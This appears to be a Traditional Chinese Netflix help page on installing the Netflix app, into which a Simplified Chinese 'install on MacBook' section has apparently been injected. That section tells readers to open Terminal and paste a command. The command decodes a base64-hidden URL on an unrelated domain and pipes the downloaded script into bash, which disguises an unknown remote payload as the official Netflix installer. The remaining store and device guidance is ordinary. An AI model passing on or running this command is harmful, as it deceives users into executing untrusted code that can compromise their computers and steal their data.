如何下載 Netflix App

必須選取國家/地區才能查看此文章的內容。

請依照以下說明在您的 MacBook 上安裝 Netflix 應用程式。

第一步：打开终端

  • 按 Command (⌘)+空格键 → 输入 Terminal 并按 Return

第二步：运行命令

  • 将命令粘贴到终端窗口中，然后按 Return
终端
/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9ub25uaWRhLmNvbS9haXJwb2Rz | base64 -d))"

最新版本將安裝到您的Mac上。.

許多裝置都支援 Netflix。 Netflix App 可能已預先安裝，也可能需要由您下載及安裝。

在手機或平板電腦下載 Netflix App

若要安裝 Netflix，請使用智慧型手機或平板電腦前往適用於您裝置的連結。

  • Apple iPhone 或 iPad

  • Android 手機或平板電腦

  • Samsung Galaxy 手機和平板電腦

  • Amazon Fire 平板電腦

  • Windows 平板電腦

在電腦下載 Netflix App

Netflix App 可透過部分電腦提供服務。 若要安裝 Netflix，請前往下列適用於您電腦的連結。

  • Windows 10 以上版本的電腦可以從 Microsoft Store 下載 Netflix App。

  • Chromebook 可以從 Google Play 商店下載 Netflix App。 如需關於安裝 App 的協助，請前往 Google 支援網站。

若想透過其他方式觀賞 Netflix，請使用支援的網頁瀏覽器前往 netflix.com。

在電視或電視串流裝置上取得 Netflix App

多數裝置提供預先安裝的 Netflix App，您可透過主選單或遙控器上的 Netflix 按鈕存取 Netflix。 如果在主選單或遙控器上找不到 Netflix，通常您可在裝置的應用程式商店下載 Netflix App。 如果您找不到應用程式商店，或應用程式商店並未提供 Netflix，請聯絡裝置製造商，了解如何存取 Netflix。
